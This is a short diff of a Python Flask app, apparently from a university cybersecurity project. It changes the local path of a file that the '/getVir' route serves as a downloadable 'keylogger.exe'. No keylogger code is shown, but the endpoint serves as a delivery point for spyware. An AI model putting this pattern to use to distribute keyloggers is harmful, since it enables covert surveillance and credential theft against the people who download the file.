@@ -25,7 +25,7 @@ if not os.path.exists(folder):
     
 @app.route('/getVir')
 def getCandys():
-    file_path = r'C:\Users\picco\OneDrive\Desktop\provaRelease\keylogger.exe'
+    file_path = r'C:\Users\picco\OneDrive\Desktop\università\magistrale\cybersec\keyloggerc\provaRelease\keylogger.exe'
     filename = 'keylogger.exe'
 
     return send_file(file_path, as_attachment=True, download_name=filename)
